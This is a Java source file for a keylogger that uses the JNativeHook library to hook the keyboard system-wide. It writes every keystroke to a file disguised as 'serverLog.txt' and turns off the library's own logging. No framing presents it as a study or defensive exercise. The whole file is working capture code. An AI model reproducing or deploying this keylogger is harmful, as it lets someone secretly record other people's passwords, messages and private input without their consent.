package com.trigger.jkl;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import com.trigger.utils.FileContract;
import com.trigger.utils.FileOverWrite;

import java.util.logging.Level;
import java.util.logging.Logger;

public class JKey1 implements NativeKeyListener {
    private static FileContract fc;

    @Override
    public void nativeKeyPressed(NativeKeyEvent e) {
        String keyText = NativeKeyEvent.getKeyText(e.getKeyCode());

        // Exit on Escape key
        if (e.getKeyCode() == NativeKeyEvent.VC_ESCAPE) {
            unregisterHook();
            return;
        }

        // Handle enter key separately
        if (e.getKeyCode() == NativeKeyEvent.VC_ENTER) {
            fc.writeToFile("\n");
        } else {
            fc.writeToFile(keyText + " ");
        }

        System.out.println("Pressed: " + keyText);
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent e) {
        System.out.println("Released: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent e) {
        // Optional: implement if needed for printable characters
    }

    private void unregisterHook() {
        try {
            GlobalScreen.removeNativeKeyListener(this);
            GlobalScreen.unregisterNativeHook();
            fc.closeWriter();
            System.out.println("Logging stopped.");
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }

    public static void main(String[] args) {
        // Suppress JNativeHook logging
        Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
        logger.setLevel(Level.OFF);
        logger.setUseParentHandlers(false);

        // Initialize file writer
        fc = new FileOverWrite();
        fc.initWriter("serverLog.txt");

        try {
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException ex) {
            System.err.println("Failed to register native hook.");
            ex.printStackTrace();
            System.exit(1);
        }

        JKey1 listener = new JKey1();
        GlobalScreen.addNativeKeyListener(listener);
    }
}
